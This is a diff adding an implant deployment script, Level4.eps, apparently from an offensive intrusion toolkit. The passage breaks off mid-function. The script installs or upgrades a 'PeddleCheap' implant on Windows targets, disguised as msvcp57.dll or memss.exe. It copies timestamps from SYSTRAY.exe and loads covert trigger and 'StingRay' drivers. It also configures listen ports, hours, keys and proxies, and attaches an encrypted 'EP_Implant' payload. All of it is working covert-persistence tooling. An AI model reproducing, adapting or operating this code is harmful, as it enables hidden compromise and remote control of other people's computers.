@@ -1,0 +1,1084 @@
+#-------------------------------------------------------------------------------
+# File: Level4.eps
+# Description: Performs a level4 install or upgrade
+#
+# Modifications:
+#	05/31/02	Created
+#	06/26/02	Added PC_1.3.0
+#	07/20/02	Added quit option
+#	12/19/02	Added port changing option
+#	07/11/03	Added id and filename changing option
+#	08/04/03	Added resource changing option
+#	04/14/04	Updated for PC 1.4
+#	08/09/05	Updated for PC 1.5
+#-------------------------------------------------------------------------------
+@include "_GetDirectory.epm";
+@include "_GetSystemVersion.epm";
+@include "_GetSystemPaths.epm";
+@include "_FileExists.epm";
+@include "_GenericFunctions.epm";
+
+
+@echo off;
+
+# make sure we can install on this version
+int $majorVersion;
+int $minorVersion;
+int $buildNumber;
+int $platformId;
+int $spMajorVersion;
+int $spMinorVersion;
+ifnot (_GetSystemVersion($majorVersion, $minorVersion, $buildNumber, $platformId, $spMajorVersion, $spMinorVersion)) {
+    echo "Unable to get system version";
+    pause;
+}
+
+int $PORT_10_6    = 3;
+int $PORT_24_HOUR = 4;
+int $RES_DLL      = 2;
+int $RES_EXE      = 3;
+int $INVALID_ID   = 0;
+
+string	%localFile;
+string	%remoteFile;
+bool	%changeName;
+bool	%changeTimes;
+int		%portVersion;
+int		%resVersion;
+string	%matchFile;
+string	%installScript;
+string	%upgradeScript;
+string	%newName;
+string	%oldName;
+bool	%stingrayCheck;
+bool	%proxy;
+
+# valid types
+string %validTypes;
+%validTypes{' 1'} = "PC (TCP/IP dll)";
+%validTypes{' 2'} = "PC (TCP/IP 24-hour dll)";
+%validTypes{' 3'} = "PC (HTTP dll)";
+%validTypes{' 4'} = "PC (TCP/IP exe)";
+%validTypes{' 5'} = "PC (TCP/IP 24-hour exe)";
+%validTypes{' 6'} = "PC (HTTP exe)";
+%validTypes{' 7'} = "PC (StingRay TCP/IP dll)";
+%validTypes{' 8'} = "PC (StingRay TCP/IP 24-hour dll)";
+%validTypes{' 9'} = "PC (StingRay TCP/IP exe)";
+%validTypes{'10'} = "PC (StingRay TCP/IP 24-hour exe)";
+
+# remove invalid types
+if ($platformId == 1) {
+    # DLL versions aren't supported on 9x
+    undef(%validTypes{' 1'});
+    undef(%validTypes{' 2'});
+    undef(%validTypes{' 3'});
+    
+    # StingRay doesn't work on 9x
+    undef(%validTypes{' 7'});
+    undef(%validTypes{' 8'});
+    undef(%validTypes{' 9'});
+    undef(%validTypes{'10'});
+
+    # cannot trigger on 9x, so http is no good
+    undef(%validTypes{' 6'});
+
+    echo "";
+    echo "*** NOTE: Triggering of PC is NOT SUPPORTED on 9x hosts ***";
+    echo "";
+}
+
+if (($platformId == 2) && ($majorVersion == 4)) {
+    # HTTP DLL doesn't work on NT 4 systems
+    undef(%validTypes{' 3'});
+
+    # StingRay doesn't work on NT 4
+    undef(%validTypes{' 7'});
+    undef(%validTypes{' 8'});
+    undef(%validTypes{' 9'});
+    undef(%validTypes{'10'});
+}
+
+# PeddleCheap (TCP/IP dll)
+%localFile{'PC (TCP/IP dll)'}			= "PC\\Level4\\msvcp57.dl_";
+%changeName{'PC (TCP/IP dll)'}			= true;
+%remoteFile{'PC (TCP/IP dll)'}			= "msvcp57.dll";
+%changeTimes{'PC (TCP/IP dll)'}			= true;
+%portVersion{'PC (TCP/IP dll)'}			= $PORT_10_6;
+%resVersion{'PC (TCP/IP dll)'}			= $RES_DLL;
+%matchFile{'PC (TCP/IP dll)'}			= "SYSTRAY.exe";
+%installScript{'PC (TCP/IP dll)'}		= "PeddleCheap\\InstallDll.eps";
+%upgradeScript{'PC (TCP/IP dll)'}		= "PeddleCheap\\UpgradeDll.eps";
+%newName{'PC (TCP/IP dll)'}			= "msvcp57.bak";
+%oldName{'PC (TCP/IP dll)'}			= "msvcp57.bk2";
+%stingrayCheck{'PC (TCP/IP dll)'}		= false;
+%proxy{'PC (TCP/IP dll)'}			= false;
+
+# PeddleCheap (TCP/IP 24-hour dll)
+%localFile{'PC (TCP/IP 24-hour dll)'}		= "PC\\Level4\\msvcp57_a.dl_";
+%changeName{'PC (TCP/IP 24-hour dll)'}		= true;
+%remoteFile{'PC (TCP/IP 24-hour dll)'}		= "msvcp57.dll";
+%changeTimes{'PC (TCP/IP 24-hour dll)'}		= false;
+%portVersion{'PC (TCP/IP 24-hour dll)'}		= $PORT_24_HOUR;
+%resVersion{'PC (TCP/IP 24-hour dll)'}		= $RES_DLL;
+%matchFile{'PC (TCP/IP 24-hour dll)'}		= "SYSTRAY.exe";
+%installScript{'PC (TCP/IP 24-hour dll)'}	= "PeddleCheap\\InstallDll.eps";
+%upgradeScript{'PC (TCP/IP 24-hour dll)'}	= "PeddleCheap\\UpgradeDll.eps";
+%newName{'PC (TCP/IP 24-hour dll)'}		= "msvcp57.bak";
+%oldName{'PC (TCP/IP 24-hour dll)'}		= "msvcp57.bk2";
+%stingrayCheck{'PC (TCP/IP 24-hour dll)'}	= false;
+%proxy{'PC (TCP/IP 24-hour dll)'}		= false;
+
+# PeddleCheap (HTTP dll)
+%localFile{'PC (HTTP dll)'}			= "PC\\Level4\\msvcp57_http.dl_";
+%changeName{'PC (HTTP dll)'}			= true;
+%remoteFile{'PC (HTTP dll)'}			= "msvcp57.dll";
+%changeTimes{'PC (HTTP dll)'}			= false;
+%resVersion{'PC (HTTP dll)'}			= $RES_DLL;
+%matchFile{'PC (HTTP dll)'}			= "SYSTRAY.exe";
+%installScript{'PC (HTTP dll)'}			= "PeddleCheap\\InstallDll.eps";
+%upgradeScript{'PC (HTTP dll)'}			= "PeddleCheap\\UpgradeDll.eps";
+%newName{'PC (HTTP dll)'}			= "msvcp57.bak";
+%oldName{'PC (HTTP dll)'}			= "msvcp57.bk2";
+%stingrayCheck{'PC (HTTP dll)'}			= false;
+%proxy{'PC (HTTP dll)'}				= true;
+
+# PeddleCheap (TCP/IP exe)
+%localFile{'PC (TCP/IP exe)'}			= "PC\\Level4\\memss.ex_";
+%changeName{'PC (TCP/IP exe)'}			= false;
+%remoteFile{'PC (TCP/IP exe)'}			= "memss.exe";
+%changeTimes{'PC (TCP/IP exe)'}			= true;
+%portVersion{'PC (TCP/IP exe)'}			= $PORT_10_6;
+%resVersion{'PC (TCP/IP exe)'}			= $RES_EXE;
+%matchFile{'PC (TCP/IP exe)'}			= "SYSTRAY.exe";
+%installScript{'PC (TCP/IP exe)'}		= "PeddleCheap\\InstallExe.eps";
+%upgradeScript{'PC (TCP/IP exe)'}		= "PeddleCheap\\UpgradeExe.eps";
+%newName{'PC (TCP/IP exe)'}			= "";
+%oldName{'PC (TCP/IP exe)'}			= "memsso.exe";
+%stingrayCheck{'PC (TCP/IP exe)'}		= false;
+%proxy{'PC (TCP/IP exe)'}			= false;
+
+# PeddleCheap (TCP/IP 24-hour exe)
+%localFile{'PC (TCP/IP 24-hour exe)'}		= "PC\\Level4\\memss_a.ex_";
+%changeName{'PC (TCP/IP 24-hour exe)'}		= false;
+%remoteFile{'PC (TCP/IP 24-hour exe)'}		= "memss.exe";
+%changeTimes{'PC (TCP/IP 24-hour exe)'}		= false;
+%portVersion{'PC (TCP/IP 24-hour exe)'}		= $PORT_24_HOUR;
+%resVersion{'PC (TCP/IP 24-hour exe)'}		= $RES_EXE;
+%matchFile{'PC (TCP/IP 24-hour exe)'}		= "SYSTRAY.exe";
+%installScript{'PC (TCP/IP 24-hour exe)'}	= "PeddleCheap\\InstallExe.eps";
+%upgradeScript{'PC (TCP/IP 24-hour exe)'}	= "PeddleCheap\\UpgradeExe.eps";
+%newName{'PC (TCP/IP 24-hour exe)'}		= "";
+%oldName{'PC (TCP/IP 24-hour exe)'}		= "memsso.exe";
+%stingrayCheck{'PC (TCP/IP 24-hour exe)'}	= false;
+%proxy{'PC (TCP/IP 24-hour exe)'}		= false;
+
+# PeddleCheap (HTTP exe)
+%localFile{'PC (HTTP exe)'}			= "PC\\Level4\\memss_http.ex_";
+%changeName{'PC (HTTP exe)'}			= false;
+%remoteFile{'PC (HTTP exe)'}			= "memss.exe";
+%changeTimes{'PC (HTTP exe)'}			= false;
+%resVersion{'PC (HTTP exe)'}			= $RES_EXE;
+%matchFile{'PC (HTTP exe)'}			= "SYSTRAY.exe";
+%installScript{'PC (HTTP exe)'}			= "PeddleCheap\\InstallExe.eps";
+%upgradeScript{'PC (HTTP exe)'}			= "PeddleCheap\\UpgradeExe.eps";
+%newName{'PC (HTTP exe)'}			= "";
+%oldName{'PC (HTTP exe)'}			= "memsso.exe";
+%stingrayCheck{'PC (HTTP exe)'}			= false;
+%proxy{'PC (HTTP exe)'}				= true;
+
+#--------------------------------------------------------------------------------
+# PeddleCheap (StingRay TCP/IP dll)
+%localFile{'PC (StingRay TCP/IP dll)'}			= "PC\\Level4\\msvcp57_sr.dl_";
+%changeName{'PC (StingRay TCP/IP dll)'}			= true;
+%remoteFile{'PC (StingRay TCP/IP dll)'}			= "msvcp57.dll";
+%changeTimes{'PC (StingRay TCP/IP dll)'}		= true;
+%portVersion{'PC (StingRay TCP/IP dll)'}		= $PORT_10_6;
+%resVersion{'PC (StingRay TCP/IP dll)'}			= $RES_DLL;
+%matchFile{'PC (StingRay TCP/IP dll)'}			= "SYSTRAY.exe";
+%installScript{'PC (StingRay TCP/IP dll)'}		= "PeddleCheap\\InstallDll.eps";
+%upgradeScript{'PC (StingRay TCP/IP dll)'}		= "PeddleCheap\\UpgradeDll.eps";
+%newName{'PC (StingRay TCP/IP dll)'}			= "msvcp57.bak";
+%oldName{'PC (StingRay TCP/IP dll)'}			= "msvcp57.bk2";
+%stingrayCheck{'PC (StingRay TCP/IP dll)'}		= true;
+%proxy{'PC (StingRay TCP/IP dll)'}			= false;
+
+# PeddleCheap (StingRay TCP/IP 24-hour dll)
+%localFile{'PC (StingRay TCP/IP 24-hour dll)'}		= "PC\\Level4\\msvcp57_sr_a.dl_";
+%changeName{'PC (StingRay TCP/IP 24-hour dll)'}		= true;
+%remoteFile{'PC (StingRay TCP/IP 24-hour dll)'}		= "msvcp57.dll";
+%changeTimes{'PC (StingRay TCP/IP 24-hour dll)'}	= false;
+%portVersion{'PC (StingRay TCP/IP 24-hour dll)'}	= $PORT_24_HOUR;
+%resVersion{'PC (StingRay TCP/IP 24-hour dll)'}		= $RES_DLL;
+%matchFile{'PC (StingRay TCP/IP 24-hour dll)'}		= "SYSTRAY.exe";
+%installScript{'PC (StingRay TCP/IP 24-hour dll)'}	= "PeddleCheap\\InstallDll.eps";
+%upgradeScript{'PC (StingRay TCP/IP 24-hour dll)'}	= "PeddleCheap\\UpgradeDll.eps";
+%newName{'PC (StingRay TCP/IP 24-hour dll)'}		= "msvcp57.bak";
+%oldName{'PC (StingRay TCP/IP 24-hour dll)'}		= "msvcp57.bk2";
+%stingrayCheck{'PC (StingRay TCP/IP 24-hour dll)'}	= true;
+%proxy{'PC (StingRay TCP/IP 24-hour dll)'}		= false;
+
+# PeddleCheap (StingRay TCP/IP exe)
+%localFile{'PC (StingRay TCP/IP exe)'}			= "PC\\Level4\\memss_sr.ex_";
+%changeName{'PC (StingRay TCP/IP exe)'}			= false;
+%remoteFile{'PC (StingRay TCP/IP exe)'}			= "memss.exe";
+%changeTimes{'PC (StingRay TCP/IP exe)'}		= true;
+%portVersion{'PC (StingRay TCP/IP exe)'}		= $PORT_10_6;
+%resVersion{'PC (StingRay TCP/IP exe)'}			= $RES_EXE;
+%matchFile{'PC (StingRay TCP/IP exe)'}			= "SYSTRAY.exe";
+%installScript{'PC (StingRay TCP/IP exe)'}		= "PeddleCheap\\InstallExe.eps";
+%upgradeScript{'PC (StingRay TCP/IP exe)'}		= "PeddleCheap\\UpgradeExe.eps";
+%newName{'PC (StingRay TCP/IP exe)'}			= "";
+%oldName{'PC (StingRay TCP/IP exe)'}			= "memsso.exe";
+%stingrayCheck{'PC (StingRay TCP/IP exe)'}		= true;
+%proxy{'PC (StingRay TCP/IP exe)'}			= false;
+
+# PeddleCheap (StingRay TCP/IP 24-hour exe)
+%localFile{'PC (StingRay TCP/IP 24-hour exe)'}		= "PC\\Level4\\memss_sr_a.ex_";
+%changeName{'PC (StingRay TCP/IP 24-hour exe)'}		= false;
+%remoteFile{'PC (StingRay TCP/IP 24-hour exe)'}		= "memss.exe";
+%changeTimes{'PC (StingRay TCP/IP 24-hour exe)'}	= false;
+%portVersion{'PC (StingRay TCP/IP 24-hour exe)'}	= $PORT_24_HOUR;
+%resVersion{'PC (StingRay TCP/IP 24-hour exe)'}		= $RES_EXE;
+%matchFile{'PC (StingRay TCP/IP 24-hour exe)'}		= "SYSTRAY.exe";
+%installScript{'PC (StingRay TCP/IP 24-hour exe)'}	= "PeddleCheap\\InstallExe.eps";
+%upgradeScript{'PC (StingRay TCP/IP 24-hour exe)'}	= "PeddleCheap\\UpgradeExe.eps";
+%newName{'PC (StingRay TCP/IP 24-hour exe)'}		= "";
+%oldName{'PC (StingRay TCP/IP 24-hour exe)'}		= "memsso.exe";
+%stingrayCheck{'PC (StingRay TCP/IP 24-hour exe)'}	= true;
+%proxy{'PC (StingRay TCP/IP 24-hour exe)'}		= false;
+
+string %info;
+%info{'type'} = "";
+%info{'id'} = <string>$INVALID_ID;
+
+bool $install;
+bool $badParams = false;
+if ($argc == 1) {
+    $badParams = true;
+} else if ($argc > 4) {
+    $badParams = true;
+} else {
+    if ($argv[1] == "INSTALL") {
+	$install = true;
+    } else if ($argv[1] == "UPGRADE") {
+	$install = false;
+    } else {
+	# unknown level4 type
+	echo "";
+	echo "***Invalid task -- must be INSTALL or UPGRADE***";
+	echo "";
+	$badParams = true;
+    }
+    
+    ifnot ($badParams) {
+	if ($argc > 2) {
+	    # user specified type of install/upgrade
+	    # and/or the ID for the PC implant
+	    string $key;
+	    foreach $key (keys %validTypes) {
+		if ($argv[2] == %validTypes{$key}) {
+		    %info{'type'} = $argv[2];
+		    break;
+		}
+	    }
+
+	    if (%info{'type'} == "") {
+		# type not found
+		echo "";
+		echo "***Invalid type***";
+		echo "";
+		$badParams = true;
+	    }
+
+	    ifnot ($badParams) {
+		# get the ID
+		if ($argc > 3) {
+		    int $id = <int>$argv[3];
+
+		    # verify id data
+		    if ($id < 0) {
+			$badParams = true;
+		    }
+
+		    if ($id > 4294967295) {
+			$badParams = true;
+		    }
+
+		    ifnot ($badParams) {
+			%info{'id'} = $argv[3];
+		    }
+		}
+	    }
+	}
+    }
+}
+
+if ($badParams) {
+    echo "Usage: $argv[0] <INSTALL | UPGRADE> [type] [id]";
+    echo "    Performs an install/upgrade of a tool";
+    echo "";
+    echo "    Valid Types:";
+    string $key;
+    foreach $key (keys %validTypes) {
+	echo "\t%validTypes{$key}";
+    }
+
+    echo "";
+    echo "    Valid IDs:";
+    echo "\t1 - 4,294,967,295";
+    echo "";
+    echo "\tIf <id> is not specified,";
+    echo "\tyou will be asked for one.";
+
+    if ($argc > 1) {
+	if ($argv[1] == "?") {
+	    return true;
+	}
+    }
+
+    return false;
+}
+
+# if the user didn't specify a type, get it
+if (%info{'type'} == "") {
+
+    # no type specified...give a list
+    echo "Install and upgrade types:";
+    string $key;
+    foreach $key (keys %validTypes) {
+	echo "($key). %validTypes{$key}";
+    }
+    echo "(0). Quit";
+
+    int $choice = -1;
+    while (%info{'type'} == "") {
+	int $value = GetInput("Pick a type");
+	if ($value == 0) {
+	    # user wants to quit
+	    return false;
+	}
+
+	string $key;
+	if ($value < 10) {
+	    $key = " $value";
+	} else {
+	    $key = "$value";
+	}
+	if (defined(%validTypes{'$key'})) {
+	    %info{'type'} = %validTypes{'$key'};
+	}
+    }
+}
+
+# install/upgrade the trigger driver
+# check to make sure we're NT 4 Sp4 or higher
+#
+# NOTE: This has to be done prior to the install/upgrade of PC.  If PC is started
+#       prior to the driver, it will attempt to register for triggers prior to 
+#       the driver being available.  This results in PC not being able to receive
+#       triggers until it is restarted (typically through a reboot).
+#
+
+bool $rtn=true;
+if (($platformId == 2) && ((($majorVersion == 4) && ($spMajorVersion >= 4)) || $majorVersion > 4)) {
+    # trigger driver compatible with this system
+
+    # first check if it's an old version of DG that can't do the dg_uninstall:
+
+    string $driverName = "ethip6";
+
+    string $root;
+    string $system;
+    string $systemPath;
+    @echo off;
+    ifnot (_GetSystemPaths($root, $system)) {
+	return false;
+    }
+    $systemPath = "$root\\$system";
+
+    string $resourcesPath;
+    ifnot (_GetLpResourcesDirectory($resourcesPath)) {
+	return false;
+    }
+
+    #see if DG is actually running already
+
+    @record on;
+    `driverlist`;
+    @record off;
+
+    string $dNames = GetCmdData("name");
+    bool $running = false;
+
+    string $i;
+    foreach $i ($dNames) {
+	string $path = SplitPath($i);
+	#echo "$path[1]";
+	if ($path[1] == "$driverName.sys") {
+		$running = true;
+		break;
+	}
+    }
+
+    bool $proceedOld = false;
+
+    if (prompt "Do you want to install/upgrade the trigger driver?") {
+
+	if ($running) {
+	
+		#at this point, it's running, so check the version.
+		
+		#check if dg_status works
+		@echo off;
+		@record on;
+		ifnot (`dg_control -version -driver $driverName`) {
+			#if this failed, that means that it's 1.0.1, so we can proceed.
+			echo "DG appears to be version 1.0.1, proceeding with the upgrade. Will require a reboot.";
+			$proceedOld = true;
+		} else {
+			int $major = GetCmdData("Major");
+			int $minor = GetCmdData("Minor");
+			int $build = GetCmdData("Build");
+		
+			if ("$major.$minor.$build" == "1.0.2") {
+				#this is 1.0.2, so we can proceed
+				echo "DG is version 1.0.2, proceeding with the upgrade. Will require a reboot.";
+				$proceedOld = true;
+			}
+		
+			else {
+				#this is 1.0.3 or greater, so we can use "upgrade"
+				echo "DG is version $major.$minor.$build, proceeding with upgrade.";
+			}
+			
+			
+		}
+		@record off;
+		@echo on;
+	
+	}	
+	
+	if ($proceedOld) {
+		echo "Upgrading...";
+	
+		ifnot (`move "$systemPath\\drivers\\$driverName.sys" "$systemPath\\drivers\\ethip.sys"`) {
+			echo "Couldn't move driver.  Find someone to help!";
+			$rtn = false;
+		}
+		
+		ifnot (`move "$systemPath\\drivers\\ethip.sys" -delay`) {
+			echo "Couldn't remove old driver.  Find someone to help!";
+			$rtn = false;
+		}
+		
+		ifnot (`put "$resourcesPath\\DoormanGauze\\ethip6.sys" -name "$systemPath\\drivers\\$driverName.sys" -permanent`) {
+			echo "Couldn't put the new driver.  Find someone to help!";
+			$rtn = false;
+		}
+		
+		ifnot (`matchtimes  "$systemPath\\drivers\\ethip.sys" "$systemPath\\drivers\\$driverName.sys"`) {
+			echo "Couldn't move driver.  Find someone to help!";
+			$rtn = false;
+		}
+		
+		# at this point, it's upgraded, skip the dg_uninstall and dg_install
+	} else {
+
+		if ($install == false) {
+			# delete previous instance
+			`dg_uninstall`;
+		}
+
+		# install the driver
+		ifnot (`dg_install`) {
+			$rtn = false;
+		} else {
+			# driver installed -- load it
+			ifnot (`dg_load`) {
+				$rtn = false;
+			}
+		}
+	}
+    }
+}
+
+# see about installing StingRay
+if (%stingrayCheck{%info{'type'}} == true) {
+    ifnot (`sr_control -available`) {
+	# driver isn't yet available -- see if they want it
+	if (prompt "Do you want to install the StingRay driver?") {
+	    # install the driver
+	    ifnot (`sr_install`) {
+		$rtn = false;
+	    } else {
+		# driver installed -- load it
+		ifnot (`sr_load`) {
+		    $rtn = false;
+		}
+	    }
+	}
+    }
+}
+
+# set default information
+%info{'localFileName'} = %localFile{%info{'type'}};
+%info{'remoteFileName'} = %remoteFile{%info{'type'}};
+if ($install) {
+    %info{'script'} = %installScript{%info{'type'}};
+} else {
+    %info{'script'} = %upgradeScript{%info{'type'}};
+}
+
+string $lFile = %info{'localFileName'};
+#################################################################################
+# Code Added to change the dll name if user is upgrading PC Version
+#################################################################################
+bool $alreadyInstalled = false;
+%oldName{%info{'type'}} = "";
+echo "";
+if (_FileExists("appinit.dll")) {
+	echo "***** appinit.dll -> * PRESENT *"; 
+	%oldName{%info{'type'}} = "appinit.dll";
+	$alreadyInstalled = true;
+} else { echo "***** appinit.dll -> not present"; }
+if (_FileExists("msvcp57.dll")) { 
+	echo "***** msvcp57.dll -> * PRESENT *"; 
+	%remoteFile{%info{'type'}} = "msvcp58.dll";
+	%oldName{%info{'type'}} = "msvcp57.dll";
+	$alreadyInstalled = true;
+} else { echo "***** msvcp57.dll -> not present"; }
+if (_FileExists("msvcp58.dll")) {
+	echo "***** msvcp58.dll -> * PRESENT *\n";
+	%oldName{%info{'type'}} = "msvcp58.dll";
+	$alreadyInstalled = true;
+} else { echo "***** msvcp58.dll -> not present\n"; }
+
+if (($argv[1] == "INSTALL") && ($alreadyInstalled == true)) {
+	echo "";
+	echo "This box already has a copy of EP present.  Please upgrade or uninstall...";
+	return false;
+}
+
+%info{'remoteFileName'} = %remoteFile{%info{'type'}};
+#################################################################################
+
+# see if the user wants to change the remote filename
+if (%changeName{%info{'type'}} == true) {
+    ifnot (prompt "Do you want to keep the default remote file name (%remoteFile{%info{'type'}})?") {
+	# user wants to change the default remote name
+	bool $correct = false;
+	while ($correct == false) {
+	    string $newFile = GetInput("Enter the new remote file name");
+
+	    # name must be 7.3
+	    string $parts = Split(".", $newFile);
+	    if ((sizeof($parts) != 2) || (strlen($parts[0]) != 7) || (strlen($parts[1]) != 3)) {
+		echo "Remote file name must be a 7.3 formatted name";
+	    } else {
+		echo "New remote file name is $newFile.";
+		if (prompt "Is this correct?") {
+		    # change the remote file name
+		    %info{'remoteFileName'} = $newFile;
+		    $correct = true;
+		}
+	    }
+	}
+
+	# change the remote name in the executable
+	ifnot (ChangeRemoteName(%info{'remoteFileName'}, %resVersion{%info{'type'}}, $lFile)) {
+	    echo "* Failed to change resource name -- quitting";
+	    return false;
+	}
+    }
+}
+
+# see if the user wants to change the listen times
+if (%changeTimes{%info{'type'}} == true) {
+    # it's possible to change times
+    ifnot (ChangeTimes($lFile)) {
+	echo "* Failed to change listen times -- quitting";
+	return false;
+    }
+}
+
+# see if the user wants to change the listen ports
+if (defined(%portVersion{%info{'type'}}) && (%portVersion{%info{'type'}} != 0)) {
+    # it's possible to change the ports
+    ifnot (ChangePorts(%portVersion{%info{'type'}}, $lFile)) {
+	echo "* Failed to change listen ports -- quitting";
+	return false;
+    }
+}
+
+# see if we need to change the key
+ifnot (ChangeKey($lFile)) {
+    echo "* Failed to change PC key";
+    return false;	
+}
+
+# see if we need to attach a payload
+ifnot (ChangePayload($lFile)) {
+    echo "* Failed to attach payload to PC";
+    return false;
+}
+
+# change the id
+ifnot (ChangeId(<int>%info{'id'}, $lFile)) {
+    echo "* Failed to change ID -- quitting";
+    return false;
+}
+
+# change proxy settings
+if(%proxy{%info{'type'}}) {
+	ifnot(ChangeProxy($lFile)) {
+		echo "* Failed to change proxy settings -- quitting";
+		return false;
+	}
+}
+
+# move the local file name back into the info hash
+%info{'localFileName'} = $lFile;
+
+# perform the install/upgrade
+bool $pcRtn = `script %info{'script'} "%info{'localFileName'}" "%info{'remoteFileName'}" "%matchFile{%info{'type'}}" "%newName{%info{'type'}}" "%oldName{%info{'type'}}"`;
+
+echo "";
+if ($pcRtn == true) {
+    echo "INSTALL/UPGRADE SUCCEEDED";
+} else {
+    echo "*** INSTALL/UPGRADE FAILED ***";
+    $rtn = false;
+}
+echo "";
+
+return $rtn;
+
+#-----------------------------------------------------------------------
+Sub ChangeId(IN int $id, REF string $localFile)
+{
+
+    int $INVALID_ID = 0;
+
+    if ($id == $INVALID_ID) {
+	echo "You must configure the PC ID.";
+	echo "";
+
+	bool $correct = false;
+	while (($correct == false) || ($id == $INVALID_ID)) {
+	    $id = GetInput("Enter the PC ID (1-4,294,967,295)");
+
+	    echo "The PC ID is $id";
+
+	    $correct = prompt "Is this correct?";
+	}
+    }
+
+     # change the ID
+     @record on;
+     ifnot (`script PeddleCheap\\ChangeID.eps "$localFile" $id`) {
+	echo "Failed to change PC ID";
+	return false;
+    }
+	
+    string $newFile = GetCmdData("file");
+    ifnot (defined($newFile)) {
+	echo "Failed to get new file's name";
+	return false;
+    }
+    @record off;
+
+    # change the local filename to our changed version
+    $localFile = $newFile;
+    
+    return true;
+}
+# END ChangeId
+
+#-----------------------------------------------------------------------
+Sub ChangeKey(REF string $localFile)
+{
+
+    if (prompt "Use the default key?") {
+	# don't change the key
+	return true;
+    }
+
+    string $key = GetInput("Enter the location of the PUBLIC key");
+
+    string $keyFile = SplitPath($key);
+
+    string $newFileName = "$localFile-$keyFile[1]";
+
+    # get the full paths
+    string $src;
+    GetFullResourcePath($localFile, $src);
+    string $dst;
+    GetFullLogPath($newFileName, $newFileName);
+
+    # copy the file
+    ifnot (`local copy "$src" "$newFileName"`) {
+	echo "Failed to copy PC to $newFileName";
+	return false;
+    }
+
+    # remove any readonly bit
+    `local setfileattribs -file "$newFileName" -attributes normal`;
+
+    # update the key resource
+    ifnot (`local resourcemanager -resourceNumber 101 -file "$newFileName" -resource "$key"`) {
+	echo "Failed to add the new key to $newFileName";
+	return false;
+    }
+
+    $localFile = $newFileName;
+    return true;
+
+}
+# END ChangeKey
+
+#-----------------------------------------------------------------------
+Sub ChangePayload(REF string $localFile)
+{
+
+    if (prompt "Configure to upload the payload each time you connect?") {
+	# don't include a payload
+	return true;
+    }
+
+    # payload types
+    string $payloadEP9x = "EP\\Bootstrap\\EP_Implant_9x.dll";
+    string $payloadEPNT = "EP\\Bootstrap\\EP_Implant.dll";
+
+    # determine which payload to do
+    int $major;
+    int $minor;
+    int $platform;
+    ifnot (_GetSystemVersion($major, $minor, $platform)) {
+	echo "* Failed to get remote system version";
+	return false;
+    }
+
+    string $newFileName = $localFile;
+    string $payload;
+    if ($platform == 1) {
+	# 9x
+	GetFullResourcePath($payloadEP9x, $payload);
+	$newFileName = "$newFileName-payload9x";
+    } else {
+	# NT
+	GetFullResourcePath($payloadEPNT, $payload);
+	$newFileName = "$newFileName-payloadNT";
+    }
+
+    # get the full paths
+    string $src;
+    GetFullResourcePath($localFile, $src);
+    GetFullLogPath($newFileName, $newFileName);
+
+    # copy the file
+    ifnot (`local copy "$src" "$newFileName"`) {
+	echo "Failed to copy PC to $newFileName";
+	return false;
+    }
+
+    # remove any readonly bit
+    `local setfileattribs -file "$newFileName" -attributes normal`;
+
+    # update the key resource
+    ifnot (`local resourcemanager -resourceNumber 1111 -encrypt -file "$newFileName" -resource "$payload"`) {
+	echo "Failed to add payload to $newFileName";
+	return false;
+    }
+
+    $localFile = $newFileName;
+    return true;
+
+}
+# END ChangePayload
+
+#-----------------------------------------------------------------------
+Sub ChangePorts(IN int $portVersion, REF string $localFile)
+{
+
+    ifnot (prompt "Do you want to keep the normal listening ports?") {
+	# user wants to change standard listening ports
+	bool $correct = false;
+	while ($correct == false) {
+	    int $i=0;
+	    int $ports;
+	    while ($i < 5) {
+		int $portVal = $i;
+		$portVal++;
+
+		$ports[$i] = 0;
+		while ($ports[$i] == 0) {
+		    $ports[$i] = GetInput("Enter (level4) listen port $portVal");
+			
+		    # convert to level 3 port
+		    $ports[$i] -= 4;
+
+		    if (($ports[$i] <= 0) || ($ports[$i] > 65535)) {
+			echo "* Invalid port value (must be between 1 and 65535)";
+			$ports[$i] = 0;
+		    }
+		}			    
+		$i++;
+	    }
+
+	    $i = 0;
+	    echo "Listen ports :";
+	    while ($i < 5) {
+		int $portVal = $i;
+		$portVal++;
+		    
+		# change back to level 4 ports
+		int $port = $ports[$i];
+		$port += 4;
+
+		echo "   $portVal - $port";
+		$i++;
+	    }
+
+	    if (prompt "Is this correct?") {
+		# change listening ports
+		@record on;
+		ifnot (`script PeddleCheap\\ChangeListenPorts.eps "$localFile" $portVersion $ports[0] $ports[1] $ports[2] $ports[3] $ports[4]`) {
+		    echo "Failed to change listen ports";
+		    return false;
+		}
+		string $newFile = GetCmdData("file");
+		ifnot (defined($newFile)) {
+		    echo "Failed to get new file's name";
+		    return false;
+		}
+		@record off;
+	
+		# change the local filename to our changed version
+		$localFile = $newFile;
+		$correct = true;
+	    }
+	}
+    }
+
+    return true;
+
+}
+# END ChangePorts
+
+#---------------------------------------------------------------
+Sub ChangeRemoteName(IN string $remoteName, IN int $resourceVersion, REF string $localFile)
+{
+    
+    # change the resource in the local file
+    @record on;
+    ifnot (`script PeddleCheap\\ChangeResourceName.eps "$localFile" $resourceVersion $remoteName`) {
+	echo "Failed to change resource name";
+	return false;
+    }
+	
+    string $newFile = GetCmdData("file");
+    ifnot (defined($newFile)) {
+	echo "Failed to get new file's name";
+	return false;
+    }
+    @record off;
+
+    # change the local filename to our changed version
+    $localFile = $newFile;
+
+    return true;
+
+}
+# END ChangeRemoteName
+
+#-----------------------------------------------------------------------
+Sub ChangeTimes(REF string $localFile)
+{
+
+    ifnot (prompt "Do you want to keep the normal listening hours?") {
+	# user wants to change standard listening hours
+	bool $correct = false;
+	while ($correct == false) {
+	    int $start = GetInput("Enter starting hour (0-23)");
+	    int $stop = GetInput("Enter ending hour (0-23)");
+
+	    echo "Listening hours $start - $stop";
+	    if (prompt "Is this correct?") {
+		# change listening hours
+		@record on;
+		ifnot (`script PeddleCheap\\ChangeListenHours.eps "$localFile" $start $stop`) {
+		    echo "Failed to change listen hours";
+		    return false;
+		}
+		string $newFile = GetCmdData("file");
+		ifnot (defined($newFile)) {
+		    echo "Failed to get new file's name";
+		    return false;
+		}
+		@record off;
+	
+		# change the local filename to our changed version
+		$localFile = $newFile;
+		$correct = true;
+	    }	    
+	}
+    }
+
+    return true;
+
+}
+# END ChangeTimes
+
+#-----------------------------------------------------------------------
+Sub ChangeProxy(REF string $localFile)
+{
+	if (prompt "Would you like to keep the default proxy settings?") {
+		return true;
+	}
+	
+	ifnot (prompt "Do you want to use the default proxy server and authentication?") {
+		@record on;
+		ifnot (`script PeddleCheap\\ChangeProxy.eps $localFile`) {
+			echo "Failed to set proxy configuration";
+			return false;
+		}
+		string $newFile = GetCmdData("file");
+		ifnot (defined($newFile)) {
+		    echo "Failed to get new file's name";
+		    return false;
+		}
